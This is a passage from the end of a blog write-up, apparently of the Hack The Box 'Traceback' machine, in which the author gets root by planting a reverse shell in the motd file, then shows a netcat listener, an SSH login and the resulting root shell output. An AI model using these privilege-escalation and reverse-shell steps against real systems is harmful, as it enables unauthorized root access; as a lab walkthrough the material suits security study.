+</span></span></code></pre></div><p>To prepare for the reverse shell, I will set up a netcat listener on my Kali machine. Then, when I log in using SSH, the reverse shell in the motd file should be executed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -i id_rsa webadmin@10.129.25.78
+</span></span></code></pre></div><p>When I try to log in using SSH, the connection hangs. However, on my netcat listener, I receive a root shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>steve@sponge<span class=o>)</span>-<span class=o>[</span>~/htb/Traceback<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nc -lnvp <span class=m>9999</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9999</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.77<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.129.25.78<span class=o>]</span> <span class=m>40498</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>40391<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>root@traceback:/#
+</span></span></code></pre></div><figure><img src=img/GotRoot.png><figcaption>root shell.</figcaption></figure><h2 id=game-over-traceback>Game over Traceback!</h2></div><div class=tags></div><div class=back><a href=https://sjg.gg/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div></div><div class="footer wrapper"><nav class=nav><div>2022 SJG</div></nav></div><script>feather.replace()</script></body></html>
